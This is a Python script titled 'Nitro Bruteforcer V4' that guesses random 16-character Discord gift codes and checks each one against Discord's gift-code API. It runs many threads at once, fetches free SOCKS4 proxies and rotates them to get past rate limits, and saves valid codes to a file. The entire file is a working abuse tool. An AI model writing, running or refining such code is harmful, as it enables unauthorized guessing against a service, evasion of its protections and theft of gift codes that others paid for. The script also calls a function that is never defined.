
# Imports
import requests
import string
import random
import threading
import json
import ctypes
import os
import sys
import time
from colorama import Fore
from traceback import format_exc
import subprocess
import psutil
import re


# Setting title up
os.system(f'cls')
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
nums = {'total': 0, 'hits': 0}
title = 'Nitro Bruteforcer V4 | Revamped by Local | Total Checked : ' + \
    str(nums['total']) + ' | Working Nitro Codes : ' + str(nums['hits'])
ctypes.windll.kernel32.SetConsoleTitleW(title)

# Setting up color system
default_color = "Fore.CYAN"
default_styling = "Style.BRIGHT"
useinprint = str(default_color) + str(default_styling)

# Generates proxies for user
def generate_proxies():
    os.system(f'cls')
    print(Fore.GREEN + 'Generating Socks4 proxies...')
    url = 'http://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all'
    r = requests.get(url, allow_redirects=True)
    open('proxies.txt', 'wb').write(r.content)
    print(Fore.GREEN + 'Generated Socks4 Proxies')
    os.system('pause')

def generate_proxies1():
    os.system(f'cls')
    url = 'http://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all'
    r = requests.get(url, allow_redirects=True)
    open('proxies.txt', 'wb').write(r.content)



def advancedSettings():
    # If proxies.txt is not found it will do the following
    if not os.path.isfile('proxies.txt'):

        print(Fore.WHITE + "--------------------------------------------------------\n| " + Fore.RED + "[Error] Hmmmm I am not detecting any proxies... ")
        print(Fore.WHITE + "|" + Fore.CYAN + " [?] Please choose what you want to do below.\n" + Fore.WHITE +
         " ----------------------------------------------- \n\n" + Fore.WHITE + "[1] Create proxies.txt file and load some proxies into it \n[2] Only create proxies.txt file\n[3] Exit\n ")
        try:
            reponse = int(input())
        except ValueError:
            print(Fore.RED + 'Not a valid number!')
            print(Fore.RED + 'Please give a valid reponse : 1 or 2 or 3')
            os.system('pause')
            sys.exit()
        if reponse == 1:
            new = open('proxies.txt', 'w')
            new.close()
            generate_proxies()
        elif reponse == 2:
            new = open('proxies.txt', 'w')
            new.close()
            os.system(f'cls')
            print(Fore.GREEN + 'Created the file.')
            print(Fore.WHITE + 'Please restart the program.')
            os.system('pause')
            sys.exit()
        elif reponse == 3:
            exitProgram()
        else:
            print(Fore.RED + 'Please give a valid reponse : 1 or 2 or 3')
            os.system('pause')
            sys.exit()


    if not os.path.isfile('nitros.txt'):
        new = open('nitros.txt', 'w')
        new.close()


    chars = string.ascii_letters + string.digits
    random.seed = os.urandom(1024)

    # Reads proxies
    proxiesRaw = open('proxies.txt', 'r')
    data = proxiesRaw.read()

    # Lets user put their own proxies
    def chooseOwnProxies():
        os.system(f'cls')
        print(Fore.CYAN + 'Put your proxies into proxies.txt')
        os.system(f'notepad proxies.txt')
        print('Please restart the program.')
        os.system(f'PAUSE')
        sys.exit()

    # Checks contents of proxies.txt
    if len(data) == 0:
        os.system(f'cls')
        print(Fore.WHITE + '------------------------------------------------------\n|' + Fore.CYAN + '[!] I have detected the proxies.txt file \n' + Fore.WHITE + '|' + Fore.RED +'[Error] I am not detecting any proxies in proxies.txt \n' + Fore.WHITE + '|' + Fore.MAGENTA + '[?] Please choose what you want to do below\n' + Fore.WHITE + '------------------------------------------------------ \n\n' + Fore.WHITE + '[1] Generate Proxies\n[2] I will add my own proxies\n[3] Exit\n[4] Report a bug')
        try:
            reponse = int(input())
        except ValueError:
            print(Fore.RED + 'Not a valid number !')
            print(Fore.RED + 'Please give a valid reponse : 1 or 2')
            os.system('pause')
            sys.exit()
        if reponse == 1:
            generate_proxies()
        elif reponse == 2:
            chooseOwnProxies()
        elif reponse == 3:
            exitProgram()
        elif reponse == 4:
            sendReport()
        else:
            print(Fore.RED + 'Please give a valid reponse : 1 or 2 or 3')
            os.system('pause')
            sys.exit()


    # Inputs to use in bruteforcer
    os.system(f'cls')
    proxies = data.split('\n')
    print(Fore.WHITE + '---------------------------------------\n' + Fore.CYAN +'[!] Found', len(proxies), 'proxies')
    print(Fore.GREEN + '[?] What type of proxy is in proxies.txt? (This program generates socks4 proxies by default)\n' + Fore.WHITE + '--------------------------------------')
    proxyChoice = input('[1] HTTP Proxies\n[2] SOCKS4 Proxies\n[3] SOCKS5 Proxies\n[4] Report a bug\n')
    if proxyChoice != '1' and proxyChoice != '2' and proxyChoice != '3' and proxyChoice != '4':
        print(Fore.RED + 'Enter a valid number.')
        os.system('pause')
        sys.exit()

    if proxyChoice == '1':
        proxyType = 'http://'
    elif proxyChoice == '2':
        proxyType = 'socks4://'
    elif proxyChoice == '3':
        proxyType = 'socks5://'
    elif proxyChoice == '4':
        sendReport()
    os.system(f'cls')
    input_ = input('Threads? : ')
    try:
        threads = int(input_)
    except ValueError:
        print(Fore.RED + 'Please enter a valid number.')
        os.system('pause')
        sys.exit()


    try:
        timeout = int(input('Timeout? (in seconds) : '))
    except ValueError:
        print(Fore.RED + 'Enter a valid number.')
        os.system('pause')
        sys.exit()

    proxyForThread = {}
    retriesForThread = {}
    for i in range(threads):
        proxyForThread['thread' + str(i)] = len(proxies) * i / threads

    for i in range(threads):
        retriesForThread['thread' + str(i)] = 1


    def genKey():
        key = ''.join(random.choice(chars) for i in range(16))
        return key


    def changeProxy(threadName):
        proxyForThread[threadName] = proxyForThread[threadName] + 1

    # Checking if code is valid, and returning a message
    def checkKey(key, threadName):
        url = 'https://discord.com/api/v6/entitlements/gift-codes/' + key
        while True:
            try:
                body = requests.get(url, proxies={'http': proxyType + proxies[int(proxyForThread[threadName])],
                                                  'https': proxyType + proxies[int(proxyForThread[threadName])]},
                                    timeout=timeout).json()
            except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
                changeProxy(threadName)
                continue
            except requests.exceptions.ProxyError:
                changeProxy(threadName)
                continue
            except requests.exceptions.ConnectionError:
                retriesForThread[threadName] = retriesForThread[threadName] + 1
                if retriesForThread[threadName] > 4:
                    changeProxy(threadName)
                    retriesForThread[threadName] = 0
                continue
            except json.decoder.JSONDecodeError:
                continue
            except (KeyError, IndexError):
                proxyForThread[threadName] = 0
                continue
            except Exception as e:
                print(e)
                retriesForThread[threadName] = retriesForThread[threadName] + 1
                if retriesForThread[threadName] > 4:
                    changeProxy(threadName)
                    retriesForThread[threadName] = 0
                continue

            retriesForThread[threadName] = 0
            break

        try:
            response = body['message']
        except (KeyError, IndexError):
            response = 'Code Found.'

        if response != 'Unknown Gift Code':
            if response != 'You are being rate limited.':
                saveKey(key, body)
                print(Fore.YELLOW + '!')
                print(Fore.YELLOW + '!')
                print(Fore.GREEN + '[+] Hit : discord.gift/' + key)
                print(Fore.YELLOW + '!')
                print(Fore.YELLOW + '!')
                nums['hits'] = nums['hits'] + 1
                title = 'Nitro Bruteforcer V3 | Revamped by Local | Tried : ' + \
                    str(nums['total']) + ' | Working Nitro Codes : ' + str(nums['hits'])
                ctypes.windll.kernel32.SetConsoleTitleW(title)
                ctypes.windll.user32.MessageBoxW(0, "You're code has been logged to nitros.txt", "I have found a working nitro code for you!", 48)
                os.system('pause')
            elif response == 'You are being rate limited.':
                changeProxy(threadName)
                checkKey(key, threadName)
        else:
            print(Fore.RED + '[-] Miss : ', key)
        nums['total'] = nums['total'] + 1
        title = 'Nitro Bruteforcer V3 | Revamped by Local | Tried : ' + \
            str(nums['total']) + ' | Working Nitro Codes : ' + str(nums['hits'])
        ctypes.windll.kernel32.SetConsoleTitleW(title)

    # Saving the valid key
    def saveKey(key, json):
        hits = open('nitros.txt', 'a+')
        hits.write('Working Nitro Code: https://discord.gift/' + key + "\n")
        hits.close()

    # Main process
    def main():
        for i in range(threads - 1):
            thread = threading.Thread(target=loop, args=('thread' + str(i + 1),))
            thread.daemon = False
            thread.start()

        while True:
            checkKey(genKey(), 'thread0')


    def loop(threadName):
        while True:
            checkKey(genKey(), threadName)

    main()

def normalSettings():
    # If proxies.txt is not found it will do the following
    if not os.path.isfile('proxies.txt'):
        generate_proxies1()

    if not os.path.isfile('nitros.txt'):
        new = open('nitros.txt', 'w')
        new.close()

    chars = string.ascii_letters + string.digits
    random.seed = os.urandom(1024)

    # Reads proxies
    proxiesRaw = open('proxies.txt', 'r')
    data = proxiesRaw.read()


    # Checks contents of proxies.txt
    if len(data) == 0:
        generate_proxies1()


    # Inputs to use in bruteforcer
    os.system(f'cls')
    proxies = data.split('\n')
    proxyType = 'socks4://'
    input_ = '350'
    try:
        threads = int(input_)
    except ValueError:
        print(Fore.RED + 'An error has occured. Please report this.')
        os.system('pause')
        sys.exit()


    try:
        timeout = int('5')
    except ValueError:
        print(Fore.RED + 'An error has occured. Please report this.')
        os.system('pause')
        sys.exit()

    proxyForThread = {}
    retriesForThread = {}
    for i in range(threads):
        proxyForThread['thread' + str(i)] = len(proxies) * i / threads

    for i in range(threads):
        retriesForThread['thread' + str(i)] = 1


    def genKey():
        key = ''.join(random.choice(chars) for i in range(16))
        return key


    def changeProxy(threadName):
        proxyForThread[threadName] = proxyForThread[threadName] + 1

    # Checking if code is valid, and returning a message
    def checkKey(key, threadName):
        url = 'https://discord.com/api/v6/entitlements/gift-codes/' + key
        while True:
            try:
                body = requests.get(url, proxies={'http': proxyType + proxies[int(proxyForThread[threadName])],
                                                  'https': proxyType + proxies[int(proxyForThread[threadName])]},
                                    timeout=timeout).json()
            except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
                changeProxy(threadName)
                continue
            except requests.exceptions.ProxyError:
                changeProxy(threadName)
                continue
            except requests.exceptions.ConnectionError:
                retriesForThread[threadName] = retriesForThread[threadName] + 1
                if retriesForThread[threadName] > 4:
                    changeProxy(threadName)
                    retriesForThread[threadName] = 0
                continue
            except json.decoder.JSONDecodeError:
                continue
            except (KeyError, IndexError):
                proxyForThread[threadName] = 0
                continue
            except Exception as e:
                print(e)
                retriesForThread[threadName] = retriesForThread[threadName] + 1
                if retriesForThread[threadName] > 4:
                    changeProxy(threadName)
                    retriesForThread[threadName] = 0
                continue

            retriesForThread[threadName] = 0
            break

        try:
            response = body['message']
        except (KeyError, IndexError):
            response = 'Code Found.'

        if response != 'Unknown Gift Code':
            if response != 'You are being rate limited.':
                saveKey(key, body)
                print(Fore.YELLOW + '!')
                print(Fore.YELLOW + '!')
                print(Fore.GREEN + '[+] Hit : discord.gift/' + key)
                print(Fore.YELLOW + '!')
                print(Fore.YELLOW + '!')
                nums['hits'] = nums['hits'] + 1
                title = 'Nitro Bruteforcer V3 | Revamped by Local | Tried : ' + \
                    str(nums['total']) + ' | Working Nitro Codes : ' + str(nums['hits'])
                ctypes.windll.kernel32.SetConsoleTitleW(title)
                ctypes.windll.user32.MessageBoxW(0, "You're code has been logged to nitros.txt", "I have found a working nitro code for you!", 48)
                os.system('pause')
            elif response == 'You are being rate limited.':
                changeProxy(threadName)
                checkKey(key, threadName)
        else:
            print(Fore.RED + '[-] Miss : ', key)
        nums['total'] = nums['total'] + 1
        title = 'Nitro Bruteforcer V3 | Revamped by Local | Tried : ' + \
            str(nums['total']) + ' | Working Nitro Codes : ' + str(nums['hits'])
        ctypes.windll.kernel32.SetConsoleTitleW(title)

    # Saving the valid key
    def saveKey(key, json):
        hits = open('nitros.txt', 'a+')
        hits.write('Working Nitro Code: https://discord.gift/' + key + "\n")
        hits.close()

    # Main process
    def main():
        for i in range(threads - 1):
            thread = threading.Thread(target=loop, args=('thread' + str(i + 1),))
            thread.daemon = False
            thread.start()

        while True:
            checkKey(genKey(), 'thread0')



    def loop(threadName):
        while True:
            checkKey(genKey(), threadName)

    main()

# Exiting program
def exitProgram():
    os.system(f'cls')
    os.system(f'title Exiting')
    print(Fore.RED + 'Now exiting program')
    os.system(f'PAUSE')
    sys.exit()

def Menu():
    print(Fore.WHITE + "--------------------------------------------------------\n| " + Fore.RED + "[?] Would you like to youse Normal Settings (Recommended), or Advanced Settings?")
    print(Fore.WHITE + "|" + Fore.CYAN + " [!] Please choose what you want to do below.\n" + Fore.WHITE +
     " ----------------------------------------------- \n\n" + Fore.WHITE + "[1] Normal Settings \n[2] Advanced Settings\n[3] Exit\n ")
    try:
        reponse = int(input())
    except ValueError:
        print(Fore.RED + 'Not a valid number!')
        print(Fore.RED + 'Please give a valid reponse : 1 or 2 or 3 or 4')
        os.system('pause')
        Menu()
    if reponse == 1:
        normalSettings()
    if reponse == 2:
        advancedSettings()
    if reponse == 3:
        exitProgram()
Menu()
